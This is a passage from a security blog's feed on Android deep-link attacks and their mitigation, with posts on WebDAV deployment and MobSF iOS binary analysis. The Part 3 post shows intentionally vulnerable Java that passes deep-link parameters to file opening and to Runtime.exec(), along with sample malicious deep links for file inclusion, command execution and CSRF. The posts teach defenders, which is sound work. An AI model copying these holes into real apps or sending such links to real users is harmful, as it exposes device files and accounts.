href="https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/">https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/</a></li><li><a href="https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32">https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32</a></li><li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress">https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress</a></li><li><a href="https://alexander.holbreich.org/docker-components-explained/">https://alexander.holbreich.org/docker-components-explained/</a></li><li><a href="https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md">https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md</a></li><li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket</a></li><li><a href="https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html">https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html</a></li><li><a href="https://blog.nody.cc/posts/container-breakouts-part2/">https://blog.nody.cc/posts/container-breakouts-part2/</a></li></ul>]]></content:encoded></item><item><title><![CDATA[Automatic Web Disk deployment with Github Actions]]></title><description><![CDATA[<p>A Web Disk (aka: WebDav) is a protocol that provides a simple interface to manage files stored on a server - it&apos;s basically an alternative to FTP that is provided by some hosting services.</p><p>Some time ago I was given the task to deploy a website using a</p>]]></description><link>inesmartins.github.io/how-to-deploy-your-website-to-webdav-web-disk-using-github-actions/</link><guid isPermaLink="false">615c89388931258b6a4f7802</guid><category><![CDATA[webdisk]]></category><category><![CDATA[webdav]]></category><category><![CDATA[docker]]></category><category><![CDATA[github action]]></category><category><![CDATA[deploy]]></category><category><![CDATA[github pages]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Tue, 05 Oct 2021 17:28:40 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/10/Screenshot-2021-10-05-at-18.36.41.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/10/Screenshot-2021-10-05-at-18.36.41.png" alt="Automatic Web Disk deployment with Github Actions"><p>A Web Disk (aka: WebDav) is a protocol that provides a simple interface to manage files stored on a server - it&apos;s basically an alternative to FTP that is provided by some hosting services.</p><p>Some time ago I was given the task to deploy a website using a WebDisk and was eager to make the process automatic with a <a href="https://github.com/features/actions">Github Action</a>, but could not find one that matched my needs.</p><p>There was, however, a very handy <a href="https://hub.docker.com/r/qautomatron/docker-webdav-disk">Docker image</a> that helped me mount the disk, so I took it and built this action, which might help you out:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/e7980b4f4fa59f68ac6d4ef0f753b42f.js"></script><!--kg-card-end: html--><p>Note that you need to adjust the <code>env</code> variables to your website, and you should also configure <code>WEBDISK_USER</code> and <code>WEBDAV_PASSWORD</code> as <a href="https://docs.github.com/en/actions/security-guides/encrypted-secrets">Github Secrets</a>.</p><p>Hope this helps someone out there :)</p>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 4 (Mitigation)]]></title><description><![CDATA[<h2 id="preventing-deep-link-hijacking">Preventing Deep Link Hijacking</h2><p>When it comes to preventing Deep Link Hijacking, the message is simple: stop using Scheme URLs and start using (properly verified) App Links or Intent URLs.</p><p>[If you&apos;re lost maybe you should go back to <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part1/index.html">Part 1</a>]</p><p>As of August 2021 <a href="https://www.appbrain.com/stats/top-android-sdk-versions">only about 6%</a></p>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-part-4-mitigation/</link><guid isPermaLink="false">614cd409fec7b20db8a36f01</guid><category><![CDATA[deep links]]></category><category><![CDATA[android]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 23 Sep 2021 20:10:50 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/09/maxresdefault-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<h2 id="preventing-deep-link-hijacking">Preventing Deep Link Hijacking</h2><img src="inesmartins.github.io/content/images/2021/09/maxresdefault-1-1.jpeg" alt="Exploiting Deep Links in Android - Part 4 (Mitigation)"><p>When it comes to preventing Deep Link Hijacking, the message is simple: stop using Scheme URLs and start using (properly verified) App Links or Intent URLs.</p><p>[If you&apos;re lost maybe you should go back to <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part1/index.html">Part 1</a>]</p><p>As of August 2021 <a href="https://www.appbrain.com/stats/top-android-sdk-versions">only about 6% of Android devices</a> were still using Android 5 (Lollipop) or earlier versions of the OS, which don&#x2019;t support App Links. So at this point, there are not a lot of excuses to still use Scheme URLs, which are insecure by design.</p><p>However, as discussed on <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part1/index.html">Part 1</a>, App Links can be tricky to verify correctly. Luckily, there are some tools that can help with this task.</p><p>Google provides a <a href="https://support.google.com/google-ads/answer/10710301?hl=en">Deep Link Validator</a> in their Ads platform as well as a <a href="https://developers.google.com/digital-asset-links/tools/generator">Statement List Generator and Tester</a>. This tools enables you to test if a given site domain grants app deep linking to the app with the specified name and <code>SHA256</code> fingerprint:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-20.36.11.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 4 (Mitigation)" loading="lazy"></figure><p>I found this tool to be insufficient, and couldn&apos;t find any other tool that gave me all of the information I needed about an application&apos;s App Links.</p><p>As such, I ended up developing <a href="https://github.com/inesmartins/Android-App-Link-Verification-Tester">an open source tool</a> that, among other things, can help you check if the App Links registered on the application are correctly verified:</p><pre><code>~ python3 Android-Deep-Link-Analyser/deeplink_analyser.py \
-apk com.twitter.android.apk \
-p com.twitter.android \
-op verify-applinks</code></pre><p>The output looks something like:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-20.40.32.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 4 (Mitigation)" loading="lazy"></figure><p>This tool has a lot of other features that might interested you. <br>Also, if you have any ideas, corrections or suggestions I would love to receive them on Github!</p><hr><h2 id="validating-untrusted-data">Validating Untrusted Data</h2><p>As a general rule, you should treat all data received via deep link as being potentially malicious. As such, this data should be properly <strong>validated</strong>, <strong>sanitized </strong>and <strong>encoded</strong>.</p><p>If you remember, a lot of the vulnerabilities we explored on the previous posts could have been prevented if the developers checked a given URL against an allowlist.</p><p>However, when parsing and checking URLs we should keep in mind that a lot of <a href="https://hackerone.com/reports/431002">popular URL parsers have known vulnerabilities</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://lh5.googleusercontent.com/KTZM2xQgLFfena7OJJakPkLnvyX3lcAdQVdinLeaIxuCVskdMO3g2es-7UT8u6kzU2532AjrJiCFFZtu2aEFl8y7ph7TyprwHTsDgYJJrcO6KN_CborYhhSlOZLTWfVTlwVc5wK7Qyw=s0" class="kg-image" alt="Exploiting Deep Links in Android - Part 4 (Mitigation)" loading="lazy"></figure><p>Note that this issue is now fixed for API 28 - triggering a deep links with a malformed URL loads the attacker&apos;s scripts in Chrome rather than the app&#x2019;s <code>WebView</code> - but this is still valid for older APIs.</p><hr><h2 id="webview-hardening">WebView Hardening</h2><p>As we saw on the previous posts, <code>WebViews</code> can potentially lead to <strong>local file exfiltration,</strong> they can allow a malicious user to <strong>access data</strong> created by other applications, and they&apos;re vulnerable to common web vulnerabilities.</p><p>So, when it comes to <code>WebViews</code> we should first ask ourselves: &quot;could we replace it with a native Android UI component?&quot; </p><p>If the answer is &quot;Yes&quot; we should go with the native approach.</p><p>If the answer is &quot;No&quot; we should enforce the following settings, unless absolutely necessary:</p><pre><code class="language-JavaScript">setJavaScriptEnabled(false);
setAllowFileAccess(false);
setAllowContentAccess(false);
setAllowFileAccessFromFileURLs(false);
setAllowUniversalAccessFromFileURLs(false);
setJavaScriptCanOpenWindowsAutomatically(false);
setMixedContentMode(1);</code></pre><p>You should also be careful when using the following options:</p><pre><code class="language-JavaScript">setDomStorageEnabled
setCacheMode
setAppCacheEnabled + setAppCachePath
setGeolocationEnabled +setGeolocationDatabasePath</code></pre><p>Note that these settings are safe by default on &quot;modern&quot; Android APIs, but you should verify if the app developer has not explicitly set an insecure configuration.</p><p>Finally, if your app directs users to URLs outside your domain, consider using <a href="https://developer.chrome.com/docs/android/custom-tabs/overview/">Chrome Custom Tabs</a> instead of a <code>WebView</code>:</p><blockquote>CCT opens faster than a browser and, if preloaded via its warm-up call, is potentially even faster than a WebView. While it still runs Javascript, it is in its own process, which prevents apps from running malicious code. Furthermore, the CCT UI provides an action bar which shows the URL of the page being loaded, along with an SSL verification lock icon for secure pages.</blockquote><hr><p>Hopefully, you&apos;re now better equipped to protect your application.<br>On the <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-pat-5-testing/index.html">next post</a> we&apos;ll explore Testing methodologies.</p>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 3]]></title><description><![CDATA[<p>So .. what else can we do with deep links?</p><hr><h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2><p>In <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-2/index.html">part 2</a> we saw how to achieve LFI via the <code>WebView.loadUrl</code> method. In this part we&apos;ll explore an alternative that doesn&apos;t require the application to contain a <code>WebView</code>. </p><p>Let&apos;s</p>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-part-3/</link><guid isPermaLink="false">61325b65ca603212098f5e4b</guid><category><![CDATA[android]]></category><category><![CDATA[deep links]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 04 Sep 2021 20:07:17 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/09/maxresdefault-1.jpeg" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/09/maxresdefault-1.jpeg" alt="Exploiting Deep Links in Android - Part 3"><p>So .. what else can we do with deep links?</p><hr><h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2><p>In <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-2/index.html">part 2</a> we saw how to achieve LFI via the <code>WebView.loadUrl</code> method. In this part we&apos;ll explore an alternative that doesn&apos;t require the application to contain a <code>WebView</code>. </p><p>Let&apos;s continue using the <code>ABC Bank</code> Android application as an example, and imagine that their customer support team uses deep links to help customers see important information displayed inside the app.</p><p>But in this case, instead of a parameter that specifies a web page, the deep link contains the path to a local file, e.g.:</p><pre><code>abcbank://help?file=how-to-enable-mfa.txt</code></pre><p>When the application receives this deep link, it opens the local file, reads its contents and displays in inside a <code>TextView</code>, as shown below:</p><pre><code class="language-Android">String file = getIntent().getData().getQueryParameter(&apos;file&apos;);

AssetManager am = getAssets()
InputStream is = am.open(file);
BufferedReader r = new BufferedReader(new InputStreamReader(is));
StringBuilder str_to_display = &quot;&quot;;

for (String line; (line = r.readline()) != null; ) {
    str_to_display.append(line).append(&apos;\n&apos;);
}

TextView tv = findViewById(R.id.myTextView);
tv.setText(str_to_display.toString());</code></pre><p>So, what&apos;s the danger here? Surely if a user sees their <em>own</em> local data displayed on the screen that&apos;s not much of an issue.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-05-at-10.59.34.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 3" loading="lazy"></figure><p>Well, for starters it depends on whether or not the application enforces any validations when it comes to the files that can be specified via deep link. If there aren&apos;t any validations, then it all comes down to the data can be accessed from the application.</p><p>Note, for example, that if the application includes the <a href="https://developer.android.com/reference/android/Manifest.permission#READ_EXTERNAL_STORAGE">READ_EXTERNAL_STORAGE</a> permission, it can access files stored in shared directories, including those generated by other apps (note that since API 29 this is not possible since all storage is scoped).</p><p>So, it&apos;s not much of a leap to imagine that a malicious application could write a file to a shared directory that would then be read by the victim app. </p><p>Depending on the <code>WebView</code> configurations, this local file could then read all of the application files and exfiltrate them to an attacker-controlled server.</p><p>The attack surface can also be expanded if the application has access to <a href="https://developer.android.com/guide/topics/providers/content-providers">Content Providers</a>, which are interfaces that allow multiple apps to share data.</p><h2 id="cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h2><p>Usually, when we talk about CSRF, we&apos;re exploiting some Cookie (mis)configuration in order to trick a user into performing an unintended action. A typical scenario would be a phishing link that performs a <code>GET</code> request that does some sort of account state change.</p><p>The same scenario is possible in Android if the application registers a deep link that &quot;automatically&quot; performs an action without any additional confirmation from the user.</p><p>A very straightforward example of this was <a href="https://hackerone.com/reports/583987">reported in 2019</a> on the Periscope app: in short, it was possible to trick a user of the Periscope application into following another user of the app, simply by tricking the victim into clicking on a deep link similar to:</p><pre><code>pscp://user/&lt;any-user-id&gt;/follow
</code></pre><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-05-at-11.11.37-1.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 3" loading="lazy" width="443" height="650"></figure><p>The application, in essence, behaves as the browser by authenticating and sending the request without confirming with the user if they want to perform said action. And the impact is basically whatever feature is supported by the app itself.</p><h2 id="remote-code-execution-rce">Remote Code Execution (RCE)</h2><p>Achieving RCE is theoretically possible, but very unlikely, since it would require very poor judgement on the part of the application&apos;s developers.</p><p>Let&apos;s go back to the <code>ABC Bank</code> Android app. Their customer support team knows that some OS versions have specific bugs, but their clients are not tech-savvy enough to check the OS by themselves, so they send them a deep link such as this one:</p><pre><code>abcbank://help?cmd=cat%20/system/build.prop</code></pre><p>When the application receives this deep link, it executes the <code>cat /system/build.prop</code> command using <a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html">Runtime.getRuntime().exec()</a>, and then the output is displayed on a <code>TextView</code>, just as before:</p><pre><code>String command = getIntent().getData().getQueryParameter(&apos;cmd&apos;);
Process process = Runtime.getRuntime().exec(command)

InputStreamReader isr = InputStreamReader(process.inputStream);
BufferedReader r = new BufferedReader(isr);
StringBuilder str_to_display = &quot;&quot;;

for (String line; (line = r.readline()) != null; ) {
    str_to_display.append(line).append(&apos;\n&apos;);
}

TextView tv = findViewById(R.id.myTextView);
tv.setText(str_to_display.toString());</code></pre><p>The client then simply reads the output to the customer support agent, which can then take that info into account when supporting the user.</p><p>In this scenario and without any additional validations, it would be possible for an attacker to remotely execute commands on the device by simply tricking a victim into clicking a deep link such as:</p><pre><code>deeplink://path?cmd=&lt;the-evil-command&gt;</code></pre><p>But, again, it would be a sign of very poor judgement to allow a user to specify commands directly via deep link, particularly without any additional validations, and proof of that is the fact that I couldn&apos;t find any actual examples of RCE reported in the wild.</p><hr><p>And that&apos;s it for now! On the next post I&apos;ll look into <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-4-mitigation/index.html">Mitigation</a>.</p>]]></content:encoded></item><item><title><![CDATA[MobSF "IPA Binary Analysis" | Step by Step]]></title><description><![CDATA[<p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a> is an open source static and dynamic analysis tool for Android and iOS, which can be used to quickly detect major issues on your mobile application.</p><p>When scanning an <code>.ipa</code>, the &quot;IPA Binary Analysis&quot; section can report multiple issues that can be hard to interpret. </p><p>Hopefully this</p>]]></description><link>inesmartins.github.io/mobsf-ipa-binary-analysis-step-by-step/</link><guid isPermaLink="false">6116ea0cfd1c6c08ebabac74</guid><category><![CDATA[ipa]]></category><category><![CDATA[mobsf]]></category><category><![CDATA[binary analysis]]></category><category><![CDATA[rev]]></category><category><![CDATA[apple]]></category><category><![CDATA[binary exploitation]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 21 Aug 2021 21:57:25 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.17.13.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.17.13.png" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step"><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a> is an open source static and dynamic analysis tool for Android and iOS, which can be used to quickly detect major issues on your mobile application.</p><p>When scanning an <code>.ipa</code>, the &quot;IPA Binary Analysis&quot; section can report multiple issues that can be hard to interpret. </p><p>Hopefully this article will help you understand why each vulnerability was reported and how to fix it.</p><hr><h2 id="getting-to-the-good-stuff">Getting to the good stuff</h2><p><code>.ipa</code> files are actually just zipped files that include the application executable and a bunch of other stuff.</p><p>When we talk about binary analysis, we&apos;re actually just talking about analysing this executable file, so the first thing we need to do is <strong>find it</strong>.</p><p>Note that if you don&apos;t have access to the <code>.ipa</code> you can extract it from the App Store using <a href="https://github.com/majd/ipatool">ipatool</a>:</p><pre><code>~ brew tap majd/repo
~ brew install ipatool
~ ipatool download --bundle-identifier &lt;app-bundle-id&gt; --email &lt;appstore-account-email&gt; --password &lt;appstore-account-password&gt;
</code></pre><p>So, now that you have your <code>.ipa</code> it&apos;s time to unzip it and look inside:</p><pre><code>~ unzip MyApp.ipa
~ cd Payload/
~ cd MyApp.app/
~ file MyApp
MyApp: Mach-O 64-bit executable arm64</code></pre><p>As you can see above, the app binary is compiled for <code>ARM</code> and uses the <code>Mach-O</code> file format.</p><p>A more thorough analysis of this binary can be done using <a href="https://www.manpagez.com/man/1/otool/">otool</a>. You should become familiar with this tool since it will help us validate and fix most of the issues reported below.</p><p>Alternatively, I also recommend <a href="https://h3adsh0tzz.com/projects/htool/">htool</a>, which serves the similar purpose of analysing <code>Mach-O</code> binaries.</p><hr><h2 id="arc">ARC</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.27.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1125" height="102" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.12.27.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-20.12.27.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.27.png 1125w"></figure><p>If you&apos;re used to working with Swift, then you most likely know <code>ARC</code> or &quot;Automatic Reference Counting&quot; simply as <a href="https://docs.swift.org/swift-book/LanguageGuide/AutomaticReferenceCounting.html">one of the core features</a> of the language. </p><p>However, <code>ARC</code> is actually a feature of the Clang compiler, and unlike with Swift, you can<em> </em>(but <a href="https://stackoverflow.com/questions/8760431/to-arc-or-not-to-arc-what-are-the-pros-and-cons/8760820#8760820">shouldn&apos;t</a>) use Objective-C without using Automatic Reference Counting.</p><p>If you&apos;ve never heard of &quot;Automatic Reference Counting&quot; you should basically know that it &quot;automatically frees up the memory used by class instances when those instances are no longer needed&quot;. </p><p>The alternative is to leave memory management to the developer, who is always less reliable and can easily make mistakes that can lead to memory corruption vulnerabilities.</p><p>So, if your application is written (at least partially) in Objective-C, you should first make sure that the project is configured to use <code>ARC</code> by checking the <code>&quot;Objective-C Automatic Reference Counting&quot;</code> setting under the <code>&quot;Build Settings&quot;</code> tab:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/image-6.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1086" height="432" srcset="inesmartins.github.io/content/images/size/w600/2021/08/image-6.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/image-6.png 1000w, inesmartins.github.io/content/images/2021/08/image-6.png 1086w"><figcaption>https://advancetechtutorial.blogspot.com/2016/07/xcode-arc-automatic-reference-counting.html</figcaption></figure><p>If this property is set to <code>No</code>, you should &quot;Convert&quot; the project, as shown below:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/image-5.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="561" height="421"><figcaption>https://stackoverflow.com/questions/8969644/tool-for-transitioning-to-arc/8969662</figcaption></figure><p>You can also check the <code>&quot;Compile Sources&quot;</code> section under the <code>&quot;Build Phases&quot;</code> tab for the presence of the <code>-fno-objc-arc</code> flag, which is used to exclude specific files from using <code>ARC</code>, as shown below:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/flag-1024x434.jpeg" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1024" height="434" srcset="inesmartins.github.io/content/images/size/w600/2021/08/flag-1024x434.jpeg 600w, inesmartins.github.io/content/images/size/w1000/2021/08/flag-1024x434.jpeg 1000w, inesmartins.github.io/content/images/2021/08/flag-1024x434.jpeg 1024w"><figcaption>https://thomashanning.com/how-to-disable-arc-for-objective-c-files/</figcaption></figure><p>Since there are limitations that come with using <code>ARC</code>, the adequacy of these exceptions should be evaluated on a case by case basis.</p><p>As mentioned above, <code>otool</code> can help us understand our binary files a little better.</p><p>When it comes to <code>ARC</code> we can use this tool to check for the presence of ARC-related symbols, such as <code>_objc_release</code>, <code>_objc_autorelease</code>, <code>_objc_storeStrong</code>, <code>_objc_retain</code>, etc.:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-11.52.58.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"></figure><p>Note the usage of <code>otool</code>&apos;s <code>-I</code> and <code>-v</code> flags:</p><pre><code>~ otool
	...
	-I print the indirect symbol table
	-v print verbosely (symbolically) when possible</code></pre><h2 id="code-signature">Code Signature</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.35.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1123" height="54" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.12.35.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-20.12.35.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.35.png 1123w"></figure><p>From the <a href="https://developer.apple.com/support/code-signing/">Apple docs on Code Signing</a> we can read:</p><blockquote>Before your app can integrate app services, be installed on a device, or be submitted to the App Store, it must be signed with a <a href="https://developer.apple.com/support/certificates/">certificate</a> issued by Apple.</blockquote><p>Also, from the <a href="https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf">iOS Security Guide</a>:</p><blockquote>In order to develop and install apps on iOS devices, developers must register with Apple and join the iOS Developer Program. The real-world identity of each developer, whether an individual or a business, is verified by Apple before their certificate is issued. <br>[...]<br>At runtime, code signature checks of all executable memory pages are made as they are loaded to ensure that an app has not been modified since it was installed or last updated.</blockquote><p>So, code signing is simply the process of signing an application with an appropriate certificate that ensures the author&apos;s identity and the app content&apos;s integrity.</p><p>Since this process is required by Apple for most operations, if this section is flagged as &quot;False&quot; by MobSF, it&apos;s likely that the file you&apos;re analysing was generated via some non-traditional method, which seems worth investigating.</p><h2 id="encrypted">Encrypted</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.17.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="932" height="55" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.14.17.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.17.png 932w"></figure><p>Similarly to the previous section, encryption shouldn&apos;t be a concern for most iOS developers, since the <code>App Store</code> takes care of it during the distribution process.</p><p>From <a href="https://iphonedev.wiki/index.php/Crack_prevention">iPhoneDev&apos;s Wiki</a>:</p><blockquote>App Store binaries are signed by both their developer and Apple. This encrypts the binary so that decryption keys are needed in order to make the binary readable.</blockquote><p>So, when it comes to the MobSF analysis you should keep in mind the origin of the <code>.ipa</code> you&apos;re testing:</p><ul><li>if you simply download it from the <code>App Store</code> (using <code>ipatool</code>, for example), then the binary should be encrypted;</li><li>if you get the <code>.ipa</code> from any other source, then most likely it&apos;s not encrypted.</li></ul><p>To confirm the binary&apos;s encryption you can use <code>otool</code> to look for the <code>LC_ENCRYPTION_INFO</code> section:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.32.27.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="462" height="120"></figure><p>From the <a href="https://iphonedev.wiki/index.php/Crack_prevention">iPhoneDev Wiki</a>:</p><blockquote>iOS can tell the encryption status of a binary via the <code>cryptid</code> struture member of <code>LC_ENCRYPTION_INFO</code> <code>MachO</code> <code>load</code> command. <br>If <code>cryptid</code> is a non-zero value then the binary in encrypted.</blockquote><p>Note that the <code>cryptsize</code> indicates the size of the encrypted segment.</p><p>Also note the usage of <code>otool</code>&apos;s <code>-l</code> flag:</p><pre><code>~ otool
	...
	-l print the load commands</code></pre><h2 id="nx">NX</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.38.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="930" height="76" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.14.38.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.14.38.png 930w"></figure><p>Although the <code>NX bit</code> is specific to the <code>AMD</code> architecture, people tend to use &quot;NX&quot; as a generic way of referring to the feature that enables you to <strong>specify non-executable memory pages</strong>. </p><p>So, in this case, the <code>NX</code> section actually refers to the <code>XN</code> or &quot;eXecute never&quot; feature, since we&apos;re dealing with an <code>ARM</code> binary.</p><p>In the <a href="https://www.apple.com/mx/privacy/docs/iOS_Security_Guide_Oct_2014.pdf">iOS Security Guide</a>, under &quot;Runtime process security&quot; we can read:</p><blockquote>Further protection is provided by iOS using ARM&#x2019;s Execute Never (XN) feature, which marks memory pages as non-executable. <br>Memory pages marked as both writable and executable can be used only by apps under tightly controlled conditions: <br>The kernel checks for the presence of the Apple-only dynamic code-signing entitlement. Even then, only a single mmap call can be made to request an executable and writable page, which is given a randomized address. </blockquote><p>So, this section should never be flagged by MobSF, as long as Apple continues to use <code>XN</code> by default.</p><h2 id="pie">PIE</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.40.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="932" height="102" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.15.40.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.15.40.png 932w"></figure><p>As explained above, each time you run a &quot;Position Independent Executable&quot; (<code>PIE</code>), the binary and all of its dependencies are loaded into random locations within virtual memory, which make ROP attacks much more difficult to execute reliably.</p><p>We can check for the presence of the <code>PIE</code> flag in our executable with <code>otool</code>: </p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1151" height="96" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.25.18-1.png 1151w"></figure><p>Note the usage of <code>otool</code>&apos;s <code>-h</code> and <code>-v</code> options:</p><pre><code>~ otool
	...
	-h print the mach header
	-v print verbosely (symbolically) when possible</code></pre><p>If this flag is not present in the binary, then you need to review your compilation settings.</p><p>First, ensure that <code>&quot;Don&apos;t Create Position Independent Executables&quot;</code> &#xA0;under <code>&quot;Build Settings&quot;</code> is set to <code>NO</code>:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2021/08/rHGq2.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy"><figcaption>https://stackoverflow.com/questions/32728783/why-would-xcode-not-use-the-build-configuration-settings-from-my-xcconfig-file</figcaption></figure><p>Then, check that these flags are set:</p><ul><li>In <code>Other C flags</code>: <code>-fPIC</code></li><li>In <code>Other Warning flags</code>: <code>-Wl,--emit-relocs</code> (retains all relocations in the executable file) and <code>-Wl,--warn-shared-textrel</code> (warns if the text segment is not shareable).</li></ul><h2 id="stack-canary">Stack Canary</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.19.33.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="932" height="124" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.19.33.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.19.33.png 932w"></figure><p>Again we can use <code>otool</code> to check whether a binary is using stack canaries by looking for some specific symbols, such as <code>_stack_chk_guard</code> and <code>_stack_chk_fail</code>:</p><figure 